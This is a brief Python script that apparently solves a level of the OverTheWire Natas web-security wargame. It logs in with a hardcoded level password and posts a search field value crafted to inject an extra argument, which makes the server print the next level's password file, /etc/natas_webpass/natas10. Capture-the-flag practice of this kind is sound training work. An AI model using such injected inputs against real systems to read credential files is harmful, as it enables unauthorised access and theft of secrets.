import requests
import re

username = 'natas9'
password = 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'

url = f'http://{username}.natas.labs.overthewire.org'

data = { 'needle' : '. /etc/natas_webpass/natas10' }

response = requests.post(url, data = data, auth = (username, password))
content = response.text

print(re.findall('/etc/natas_webpass/natas10:(.*)', content)[0])